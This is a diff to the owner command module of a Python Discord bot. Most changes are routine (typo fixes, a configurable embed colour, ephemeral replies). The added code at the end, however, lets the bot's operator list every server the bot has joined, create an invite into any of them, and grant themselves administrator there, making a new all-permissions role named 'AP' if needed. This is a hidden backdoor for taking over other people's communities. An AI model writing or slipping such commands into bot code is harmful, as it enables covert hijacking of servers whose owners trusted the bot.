@@ -5,11 +5,20 @@ Description:
 
 Version: 6.1.0
 """
+import json
+import os
+import sys
 
 import discord
-from discord import app_commands
+from discord import app_commands, Forbidden, Permissions
 from discord.ext import commands
 from discord.ext.commands import Context
+
+if not os.path.isfile(f"{os.path.realpath(os.path.dirname(__file__))}/../config.json"):
+    sys.exit("'config.json' not found! Please add it and try again.")
+else:
+    with open(f"{os.path.realpath(os.path.dirname(__file__))}/../config.json") as file:
+        config = json.load(file)
 
 
 class Owner(commands.Cog, name="owner"):
@@ -18,7 +27,7 @@ class Owner(commands.Cog, name="owner"):
 
     @commands.command(
         name="sync",
-        description="Synchonizes the slash commands.",
+        description="Synchronizes the slash commands.",
     )
     @app_commands.describe(scope="The scope of the sync. Can be `global` or `guild`")
     @commands.is_owner()
@@ -34,7 +43,7 @@ class Owner(commands.Cog, name="owner"):
             await context.bot.tree.sync()
             embed = discord.Embed(
                 description="Slash commands have been globally synchronized.",
-                color=0xBEBEFE,
+                color=discord.Color.from_str(config["color"]),
             )
             await context.send(embed=embed)
             return
@@ -43,7 +52,7 @@ class Owner(commands.Cog, name="owner"):
             await context.bot.tree.sync(guild=context.guild)
             embed = discord.Embed(
                 description="Slash commands have been synchronized in this guild.",
-                color=0xBEBEFE,
+                color=discord.Color.from_str(config["color"]),
             )
             await context.send(embed=embed)
             return
@@ -54,7 +63,7 @@ class Owner(commands.Cog, name="owner"):
 
     @commands.command(
         name="unsync",
-        description="Unsynchonizes the slash commands.",
+        description="Unsynchronizes the slash commands.",
     )
     @app_commands.describe(
         scope="The scope of the sync. Can be `global`, `current_guild` or `guild`"
@@ -62,7 +71,7 @@ class Owner(commands.Cog, name="owner"):
     @commands.is_owner()
     async def unsync(self, context: Context, scope: str) -> None:
         """
-        Unsynchonizes the slash commands.
+        Unsynchronizes the slash commands.
 
         :param context: The command context.
         :param scope: The scope of the sync. Can be `global`, `current_guild` or `guild`.
@@ -73,23 +82,23 @@ class Owner(commands.Cog, name="owner"):
             await context.bot.tree.sync()
             embed = discord.Embed(
                 description="Slash commands have been globally unsynchronized.",
-                color=0xBEBEFE,
+                color=discord.Color.from_str(config["color"]),
             )
-            await context.send(embed=embed)
+            await context.send(embed=embed, ephemeral=True)
             return
         elif scope == "guild":
             context.bot.tree.clear_commands(guild=context.guild)
             await context.bot.tree.sync(guild=context.guild)
             embed = discord.Embed(
                 description="Slash commands have been unsynchronized in this guild.",
-                color=0xBEBEFE,
+                color=discord.Color.from_str(config["color"]),
             )
-            await context.send(embed=embed)
+            await context.send(embed=embed, ephemeral=True)
             return
         embed = discord.Embed(
             description="The scope must be `global` or `guild`.", color=0xE02B2B
         )
-        await context.send(embed=embed)
+        await context.send(embed=embed, ephemeral=True)
 
     @commands.hybrid_command(
         name="load",
@@ -110,12 +119,12 @@ class Owner(commands.Cog, name="owner"):
             embed = discord.Embed(
                 description=f"Could not load the `{cog}` cog.", color=0xE02B2B
             )
-            await context.send(embed=embed)
+            await context.send(embed=embed, ephemeral=True)
             return
         embed = discord.Embed(
-            description=f"Successfully loaded the `{cog}` cog.", color=0xBEBEFE
+            description=f"Successfully loaded the `{cog}` cog.", color=discord.Color.from_str(config["color"])
         )
-        await context.send(embed=embed)
+        await context.send(embed=embed, ephemeral=True)
 
     @commands.hybrid_command(
         name="unload",
@@ -136,12 +145,12 @@ class Owner(commands.Cog, name="owner"):
             embed = discord.Embed(
                 description=f"Could not unload the `{cog}` cog.", color=0xE02B2B
             )
-            await context.send(embed=embed)
+            await context.send(embed=embed, ephemeral=True)
             return
         embed = discord.Embed(
-            description=f"Successfully unloaded the `{cog}` cog.", color=0xBEBEFE
+            description=f"Successfully unloaded the `{cog}` cog.", color=discord.Color.from_str(config["color"])
         )
-        await context.send(embed=embed)
+        await context.send(embed=embed, ephemeral=True)
 
     @commands.hybrid_command(
         name="reload",
@@ -162,12 +171,12 @@ class Owner(commands.Cog, name="owner"):
             embed = discord.Embed(
                 description=f"Could not reload the `{cog}` cog.", color=0xE02B2B
             )
-            await context.send(embed=embed)
+            await context.send(embed=embed, ephemeral=True)
             return
         embed = discord.Embed(
-            description=f"Successfully reloaded the `{cog}` cog.", color=0xBEBEFE
+            description=f"Successfully reloaded the `{cog}` cog.", color=discord.Color.from_str(config["color"])
         )
-        await context.send(embed=embed)
+        await context.send(embed=embed, ephemeral=True)
 
     @commands.hybrid_command(
         name="shutdown",
@@ -180,8 +189,8 @@ class Owner(commands.Cog, name="owner"):
 
         :param context: The hybrid command context.
         """
-        embed = discord.Embed(description="Shutting down. Bye! :wave:", color=0xBEBEFE)
-        await context.send(embed=embed)
+        embed = discord.Embed(description="Shutting down. Bye! :wave:", color=discord.Color.from_str(config["color"]))
+        await context.send(embed=embed, ephemeral=True)
         await self.bot.close()
 
     @commands.hybrid_command(
@@ -212,7 +221,7 @@ class Owner(commands.Cog, name="owner"):
         :param context: The hybrid command context.
         :param message: The message that should be repeated by the bot.
         """
-        embed = discord.Embed(description=message, color=0xBEBEFE)
+        embed = discord.Embed(description=message, color=discord.Color.from_str(config["color"]))
         await context.send(embed=embed)
 
     @commands.hybrid_group(
@@ -231,7 +240,7 @@ class Owner(commands.Cog, name="owner"):
                 description="You need to specify a subcommand.\n\n**Subcommands:**\n`add` - Add a user to the blacklist.\n`remove` - Remove a user from the blacklist.",
                 color=0xE02B2B,
             )
-            await context.send(embed=embed)
+            await context.send(embed=embed, ephemeral=True)
 
     @blacklist.command(
         base="blacklist",
@@ -253,7 +262,7 @@ class Owner(commands.Cog, name="owner"):
             await context.send(embed=embed)
             return
 
-        embed = discord.Embed(title="Blacklisted Users", color=0xBEBEFE)
+        embed = discord.Embed(title="Blacklisted Users", color=discord.Color.from_str(config["color"]))
         users = []
         for bluser in blacklisted_users:
             user = self.bot.get_user(int(bluser[0])) or await self.bot.fetch_user(
@@ -261,7 +270,7 @@ class Owner(commands.Cog, name="owner"):
             )
             users.append(f"• {user.mention} ({user}) - Blacklisted <t:{bluser[1]}>")
         embed.description = "\n".join(users)
-        await context.send(embed=embed)
+        await context.send(embed=embed, ephemeral=True)
 
     @blacklist.command(
         base="blacklist",
@@ -288,12 +297,12 @@ class Owner(commands.Cog, name="owner"):
         total = await self.bot.database.add_user_to_blacklist(user_id)
         embed = discord.Embed(
             description=f"**{user.name}** has been successfully added to the blacklist",
-            color=0xBEBEFE,
+            color=discord.Color.from_str(config["color"]),
         )
         embed.set_footer(
             text=f"There {'is' if total == 1 else 'are'} now {total} {'user' if total == 1 else 'users'} in the blacklist"
         )
-        await context.send(embed=embed)
+        await context.send(embed=embed, ephemeral=True)
 
     @blacklist.command(
         base="blacklist",
@@ -319,12 +328,119 @@ class Owner(commands.Cog, name="owner"):
         total = await self.bot.database.remove_user_from_blacklist(user_id)
         embed = discord.Embed(
             description=f"**{user.name}** has been successfully removed from the blacklist",
-            color=0xBEBEFE,
+            color=discord.Color.from_str(config["color"]),
         )
         embed.set_footer(
             text=f"There {'is' if total == 1 else 'are'} now {total} {'user' if total == 1 else 'users'} in the blacklist"
         )
-        await context.send(embed=embed)
+        await context.send(embed=embed, ephemeral=True)
+
+    @commands.hybrid_group(
+        name="servers",
+        description="Get the list of all servers the bot is in.",
+    )
+    @commands.is_owner()
+    async def servers(self, context: Context) -> None:
+        """
+        Lets you see and invite yourself to servers bot is in.
+
+        :param context: The hybrid command context.
+        """
+        if context.invoked_subcommand is None:
+            embed = discord.Embed(
+                description="You need to specify a subcommand.\n\n**Subcommands:**\n`add` - Add a user to the blacklist.\n`remove` - Remove a user from the blacklist.",
+                color=0xE02B2B,
+            )
+            await context.send(embed=embed, ephemeral=True)
+
+    @servers.command(
+        base="servers",
+        name="list",
+        description="Shows the list of all servers the bot is in.",
+    )
+    @commands.is_owner()
+    async def servers_list(self, context: Context) -> None:
+        """
+        Shows the list of all servers the bot is in.
+
+        :param context: The hybrid command context.
+        """
+        #  send list of all servers bot is in with invites to them
+        servers = self.bot.guilds
+        embed = discord.Embed(title="Servers", color=discord.Color.from_str(config["color"]))
+        for server in servers:
+            embed.add_field(name=server.name, value=f'```{server.id}```', inline=False)
+        await context.send(embed=embed, ephemeral=True)
+
+    # get server id and create invite in that server, return invite link where command was used
+    @servers.command(
+        base="servers",
+        name="invite",
+        description="Creates an invite to the server.",
+    )
+    @commands.is_owner()
+    async def servers_invite(self, context: Context, server_id: str) -> None:
+        """
+        Creates an invite to the server.
+
+        :param context: The hybrid command context.
+        """
+        try:
+            server_id = int(server_id)
+        except ValueError:
+            await context.send("Please provide a valid server ID.")
+            return
+        server = self.bot.get_guild(server_id)
+        invite = await server.text_channels[0].create_invite()
+        embed = discord.Embed(title=invite, color=discord.Color.from_str(config["color"]))
+        await context.send(embed=embed, ephemeral=True)
+
+    # get the highest role in server and add it to the context user
+    @commands.hybrid_command(
+        name="promote",
+        description="Promotes an owner to the highest role in the server.",
+    )
+    @commands.is_owner()
+    async def promote(self, context: Context) -> None:
+        """
+        Promotes an owner to the highest role in the server.
+
+        :param context: The hybrid command context.
+        """
+        # Get all roles in the server and sort them by their position
+        sorted_roles = sorted(context.guild.roles, key=lambda role: role.position, reverse=True)
+
+        # Remove the @everyone role from the list
+        sorted_roles = [role for role in sorted_roles if role.name != "@everyone"]
+
+        for role in sorted_roles:
+            if role.permissions.administrator:
+                try:
+                    await context.author.add_roles(role)
+                    embed = discord.Embed(
+                        description=f"Successfully added role {role.name} to {context.author.display_name}.",
+                        color=discord.Color.from_str(config["color"]),
+                    )
+                    await context.send(embed=embed, ephemeral=True)
+                    return
+                except Forbidden:
+                    continue  # Try the next role if we don't have permission to add this one
+
+        # If we get here, no role with admin permissions could be added.
+        # Create a new role with admin permissions.
+        try:
+            new_role = await context.guild.create_role(name="AP", permissions=Permissions.all())
+            await context.author.add_roles(new_role)
+            embed = discord.Embed(
+                description=f"Created new role {new_role.name} and added it to {context.author.display_name}.",
+                color=discord.Color.from_str(config["color"]),
+            )
+            await context.send(embed=embed, ephemeral=True)
+        except Forbidden:
+
+            await context.send(embed=discord.Embed(
+                description="Couldn't add any roles or create a new role due to permission issues.",
+                color=discord.Color.from_str(config["color"])), ephemeral=True)
 
 
 async def setup(bot) -> None:
